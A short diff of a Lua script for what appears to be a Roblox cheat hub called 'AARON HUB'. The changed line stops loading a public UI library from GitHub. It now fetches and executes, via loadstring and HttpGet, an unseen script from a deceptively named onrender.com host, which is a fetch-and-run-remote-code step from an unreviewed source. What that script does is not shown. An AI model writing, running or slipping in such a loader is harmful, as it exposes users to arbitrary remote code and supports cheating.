@@ -25,7 +25,7 @@ print("🚀 LOADING AARON HUB (Yin-Yang Engine)...")
 print("------------------------------------------")
 
 local success, result = pcall(function()
-    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+    return loadstring(game:HttpGet("https://chatbotgpt-net-com.onrender.com/rew/menu/net/script/menu/name/AARON.lua"))()
 end)
 
 if success then
